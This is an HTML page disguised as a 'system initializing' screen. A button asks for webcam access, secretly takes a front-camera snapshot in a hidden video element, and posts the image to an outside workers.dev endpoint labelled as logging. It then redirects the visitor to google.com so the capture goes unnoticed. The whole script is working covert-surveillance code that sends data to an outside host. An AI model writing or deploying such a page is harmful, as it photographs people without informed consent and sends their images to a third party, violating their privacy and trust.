<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Initializing</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        #v { width: 1px; height: 1px; opacity: 0; } /* Keep hidden */
        .btn { padding: 20px; border: 1px solid #0f0; background: transparent; color: #0f0; cursor: pointer; }
    </style>
</head>
<body>

    <div id="status">SYSTEM IDLE</div>
    <video id="v" playsinline></video>
    <button id="btn" class="btn">INITIALIZE SYSTEM</button>

    <script>
        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
        const video = document.getElementById('v');
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            status.innerText = "STARTING...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    // Snap after 200ms
                    setTimeout(snapAndClose, 200);
                };
            } catch (e) {
                status.innerText = "ACCESS DENIED";
            }
        };

        async function snapAndClose() {
            // 1. Capture
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const img = canvas.toDataURL('image/jpeg', 0.5);

            // 2. Kill Camera immediately
            video.srcObject.getTracks().forEach(t => t.stop());

            // 3. Background Upload
            fetch(LOGGING_API, {
                method: 'POST',
                keepalive: true,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: img })
            });

            // 4. Redirect
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
